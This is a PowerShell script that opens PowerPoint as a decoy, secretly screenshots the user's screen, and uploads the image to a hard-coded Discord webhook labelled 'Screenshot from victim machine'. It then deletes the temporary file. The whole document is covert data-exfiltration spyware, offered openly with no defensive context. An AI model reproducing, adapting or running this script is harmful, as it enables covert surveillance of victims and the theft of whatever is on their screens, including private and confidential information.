# Open PowerPoint silently
Start-Process "POWERPNT.EXE"

# Take screenshot
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)

# Save screenshot to temp file
$tempPath = "$env:TEMP\screenshot.png"
$bitmap.Save($tempPath, [System.Drawing.Imaging.ImageFormat]::Png)

# Upload to Discord webhook
$webhookUrl = "https://discordapp.com/api/webhooks/1398783299920597035/uoS4qd_KtGxwy5mSmla443opVHlvme6bXUeQfFayaNOdtof4Pr_A0u-qVwL20gWz2ATT"

# Prepare multipart/form-data
$boundary = "----DiscordBoundary" + [System.Guid]::NewGuid().ToString()
$LF = "`r`n"
$bodyLines = @(
    "--$boundary",
    'Content-Disposition: form-data; name="content"',
    '',
    "📸 Screenshot from victim machine",
    "--$boundary",
    'Content-Disposition: form-data; name="file"; filename="screenshot.png"',
    'Content-Type: image/png',
    '',
    [System.IO.File]::ReadAllBytes($tempPath),
    "--$boundary--",
    ''
)

$bodyBytes = [System.Text.Encoding]::UTF8.GetBytes(($bodyLines -join $LF))

# Create HTTP request
$wc = New-Object System.Net.WebClient
$wc.Headers.Add("Content-Type", "multipart/form-data; boundary=$boundary")
$wc.UploadData($webhookUrl, "POST", $bodyBytes) | Out-Null

# Clean up temp file
Remove-Item $tempPath -ErrorAction SilentlyContinue
